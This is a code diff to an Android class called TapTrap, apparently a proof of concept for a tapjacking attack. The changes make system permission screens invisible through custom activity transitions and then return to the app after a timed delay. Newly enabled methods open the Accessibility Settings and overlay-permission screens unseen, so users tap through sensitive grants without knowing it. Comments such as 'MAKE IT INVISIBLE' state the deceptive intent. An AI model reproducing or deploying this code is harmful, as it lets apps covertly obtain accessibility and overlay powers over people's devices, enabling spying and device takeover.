@@ -56,7 +56,7 @@ public class TapTrap {
         activity.startActivity(intent);
 
         // 🔴 MAKE IT INVISIBLE
-        activity.overridePendingTransition(R.anim.ani, R.anim.ani);
+        activity.overridePendingTransition(R.anim.ani, 1);
 
         // 🔴 ESCAPE BEFORE DIALOG BECOMES VISIBLE (2.8 seconds)
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
@@ -76,27 +76,53 @@ public class TapTrap {
         activity.startActivity(intent);
 
         // 🔴 MAKE IT INVISIBLE
-        activity.overridePendingTransition(R.anim.ani, R.anim.ani);
+        activity.overridePendingTransition(R.anim.ani, 1);
 
         // 🔴 ESCAPE BEFORE SCREEN BECOMES VISIBLE (2.8 seconds)
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
             activity.startActivity(new Intent(activity, activity.getClass()));
             activity.finish();
-        }, 2800);
+        }, 3000);
     }
 
-//    public void launchAppAccessibilityTrap() {
+    public void launchAppAccessibilityTrap() {
 //        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
 //        intent.setData(android.net.Uri.parse("package:" + activity.getPackageName()));
 //        activity.startActivity(intent);
-//
-//        activity.overridePendingTransition(R.anim.ani, R.anim.ani);
-//
+
+        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        activity.startActivity(intent);
+
+        activity.overridePendingTransition(R.anim.ani, 1);
+
 //        new Handler(Looper.getMainLooper()).postDelayed(() -> {
 //            activity.startActivity(new Intent(activity, activity.getClass()));
 //            activity.finish();
 //        }, 2800);
-//    }
+    }
+
+
+    public void launchAppAccessibilityTrap2() {
+//        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+//        intent.setData(android.net.Uri.parse("package:" + activity.getPackageName()));
+//        activity.startActivity(intent);
+
+        Intent intent = new Intent(
+                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                Uri.parse("package:" + activity.getPackageName())
+        );
+        activity.startActivity(intent);
+
+        activity.overridePendingTransition(R.anim.ani, 1);
+
+//        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+//            activity.startActivity(new Intent(activity, activity.getClass()));
+//            activity.finish();
+//        }, 2800);
+    }
+
+
 
     public void testInvisiblePermission() {
         // Request permission
@@ -158,28 +184,13 @@ public class TapTrap {
 
 
         // Escape after delay
-//        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-//            activity.startActivity(new Intent(activity, activity.getClass()));
-//            activity.finish();
-//        }, 4000);
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            activity.startActivity(new Intent(activity, activity.getClass()));
+            activity.finish();
+        }, 4000);
     }
 
 
-    public void testWithWebBrowser() {
-
-
-
-        // Target a regular app (browser)
-        Intent intent = new Intent(Intent.ACTION_VIEW);
-        intent.setData(Uri.parse("https://www.google.com"));
-
-        activity.startActivity(intent);
-
-        // Apply invisible animation
-        //activity.overridePendingTransition(R.anim.ani2, R.anim.ani2);
-        activity.overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out);
-        Log.d("TapTrap", "Browser should be invisible");
-    }
 
 
 
